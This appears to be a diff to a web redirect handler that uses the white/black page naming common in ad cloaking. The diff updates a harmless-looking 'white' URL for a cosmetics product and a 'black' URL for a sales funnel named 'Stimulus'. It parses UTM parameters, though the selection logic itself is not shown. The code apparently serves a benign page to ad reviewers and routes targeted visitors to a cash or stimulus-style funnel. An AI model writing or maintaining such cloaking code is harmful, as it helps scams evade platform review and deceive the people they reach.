@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://boopbeauty.co.uk/products/optimal-skin-pro-serum-copy";
-    const blackPageURL = "https://gymboreeusk.myfunnelish.com/cash-1735686017557538-1759052013535697";
+    const whitePageURL = "https://www.justmylook.com/products/bobbi-brown-weightless-skin-foundation-spf15-30ml";
+    const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
